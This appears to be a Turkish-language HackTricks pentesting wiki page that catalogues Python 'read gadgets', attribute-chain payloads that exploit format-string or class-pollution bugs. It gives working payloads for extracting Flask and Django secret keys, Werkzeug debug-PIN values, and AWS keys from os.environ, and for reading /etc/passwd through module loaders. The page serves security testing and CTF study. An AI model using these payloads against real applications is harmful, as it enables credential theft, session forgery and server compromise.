# Python Internal Read Gadgets

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

[**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) veya [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) gibi farklı güvenlik açıkları, **Python internal verilerini okumanıza ancak code çalıştırmanıza izin vermeyebilir**. Bu nedenle bir pentester, **hassas ayrıcalıkları elde etmek ve güvenlik açığını escalate etmek** için bu okuma izinlerinden mümkün olduğunca yararlanmalıdır.

### Flask - secret key'i okuma

Bir Flask uygulamasının ana sayfasında muhtemelen bu **secret'ın yapılandırıldığı** **`app`** global object bulunur.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Bu durumda, [**Bypass Python sandboxes sayfasındaki**](bypass-python-sandboxes/index.html) **global nesnelere erişmek** için herhangi bir gadget kullanarak bu nesneye erişmek mümkündür.

**Vulnerability farklı bir Python dosyasındaysa**, ana dosyaya ulaşmak ve **global object `app.secret_key`'e erişmek** için dosyalar arasında geçiş yapabilen bir gadget gerekir; böylece bu key'i bilerek [**yetkileri yükseltebilirsiniz**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

[Bu writeup'tan](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup> alınmış bunun gibi bir payload:
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Bu payload'u **`app.secret_key` okumak** için kullanın. Orijinal bug size ayrıca bir write primitive sağlıyorsa (örneğin class pollution), aynı path'i bunu değiştirmek ve daha ayrıcalıklı Flask cookie'lerini imzalamak için kullanabilirsiniz.

### Werkzeug - machine_id ve node uuid

[**Bu writeup'taki payload'ları kullanarak**](https://vozec.fr/writeups/tweedle-dum-dee/) **machine_id** ve **uuid** node'una erişebileceksiniz. Bunlar, [**Werkzeug pin'ini generate etmek**](../../network-services-pentesting/pentesting-web/werkzeug.md) ve **debug mode** etkinse `/console` içindeki python console'una erişmek için ihtiyaç duyduğunuz **private bit**'lerdir:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Web sayfasında **error** oluşturarak size yolu **verecek** şekilde **sunucunun `app.py` dosyasının yerel yolunu** elde edebileceğinizi unutmayın.

Vulnerability farklı bir python dosyasındaysa, ana python dosyasındaki nesnelere erişmek için önceki Flask trick'ini kontrol edin.

### Django - SECRET_KEY ve ayarlar modülü

Django settings nesnesi, uygulama başladığında `sys.modules` içinde önbelleğe alınır. Yalnızca read primitive'leriyle **SECRET_KEY** değerini, fallback key'lerini, database credentials'larını veya signing salt'larını leak edebilirsiniz:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Zafiyetli gadget başka bir module içindeyse, önce globals üzerinde ilerleyin:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS`, mevcut `SECRET_KEY` kadar değerlidir: rotasyon sırasında eski imzalanmış değerleri doğrulamaya devam ederler.<sup>[[1]](#references)</sup> Ayrıca etkinin yalnızca cookie forgery ile mi sınırlı olduğunu yoksa daha güçlü bir etki mi bulunduğunu hızlıca belirlemek için `SESSION_ENGINE` ve `SESSION_SERIALIZER` değerlerini de leak edin. Web etkisinin ayrıntıları için [**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md) sayfasına bakın.

### Module loader gadgets - source code ve dosyaları okuma

Yüklenmiş Python modülleri genellikle bir `__loader__` nesnesini korur. File-backed loader'lar çoğunlukla `get_source()` ve `get_data()` işlevlerini sunar; bunlar bir modül nesnesine erişebildiğiniz, ancak `open()` işlevine erişemediğiniz durumlarda mükemmel **salt-okunur primitives** sağlar:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Bu, **config modules, blueprints, helper files veya hidden routes** dökmek ve API anahtarlarını, DSN’leri, flag path’lerini ya da ek gadget entry point’lerini kurtarmak için oldukça kullanışlıdır.

Yalnızca subclass enumeration’a sahipseniz, sabit bir index kullanmak yerine loader’da ada göre arama yapın:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Generator / coroutine frame globals

Bir generator/coroutine nesnesi oluşturabilir veya ona ulaşabilirseniz, herhangi bir `__globals__` gadget'ına ihtiyaç duymadan frame üzerinden globals leak edebilirsiniz. Bu, yalnızca dunder adlarını engelleyen ve `gi_frame`, `ag_frame`, `cr_frame` veya `f_globals` gibi frame attribute'larını gözden kaçıran filtrelere karşı kullanışlıdır:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Frame globals elde ettikten sonra diğer gadget'larda olduğu gibi (`sys.modules`, settings objeleri, `os.environ` vb.) devam edin. Recent sandbox escape'ler bunu yeniden keşfetmeye devam ediyor; çünkü `gi_frame` ve `f_globals` dunder attribute'ları değildir ve çoğu zaman naif deny-list'lerden kurtulurlar.

### Yüklenmiş modüller üzerinden environment variables / cloud creds

Birçok jail hâlâ bir yerde `os` veya `sys` import eder. Ulaşılabilir herhangi bir `__init__.__globals__` fonksiyonunu, zaten import edilmiş `os` modülüne pivot yapmak ve API token'ları, cloud key'leri veya flag'leri içeren **environment variables** değerlerini dökmek için abuse edebilirsiniz:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Alt sınıf indeksi filtrelenirse loaders kullanın:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Environment variables, read'den full compromise'a geçmek için sıklıkla gereken tek secret'lardır (cloud IAM keys, database URLs, signing keys vb.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), etkilenen sürümler `<0.61.0`) hazırlanmış component request'leri aracılığıyla **class pollution** yapılmasına izin veriyordu. `__init__.__globals__` gibi bir property path, component-module globals'a ve import edilmiş module'lere erişebiliyordu; advisory, salt read-only bir exploit yerine Django'nun `SECRET_KEY`'inin ve `os.environ` içindeki değerlerin üzerine yazılabildiğini gösteriyor.<sup>[[5]](#references)</sup> Ayrı bir bug aynı object graph'a read access sağlıyorsa bu globals, code execution gerektirmeden configuration ve credentials bilgilerini açığa çıkarabilir.

### Zincirleme için Gadget koleksiyonları

Yakın tarihli CTF'ler ve pyjail araştırmaları, yalnızca attribute access ve subclass enumeration kullanılarak oluşturulmuş güvenilir read chain'ler gösteriyor. [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) gibi community-maintained listeler, object'lerden `__globals__`, `sys.modules` ve son olarak sensitive data'ya geçmek için birleştirebileceğiniz yüzlerce minimal gadget'ı kataloglar.<sup>[[2]](#references)</sup> Raw subclass index'leri yerine **attribute/name based search** kullanmayı tercih edin; çünkü `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` vb. öğelerin konumu Python sürümleri arasında ve ek imported library'lerle birlikte değişir.

## References

- [1] [Django cryptographic signing docs](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – FCSC 2023 writeup](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Django-Unicorn Class Pollution Vulnerability, Leading to RCE, XSS, DoS and Authentication Bypass (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)
{{#include ../../banners/hacktricks-training.md}}
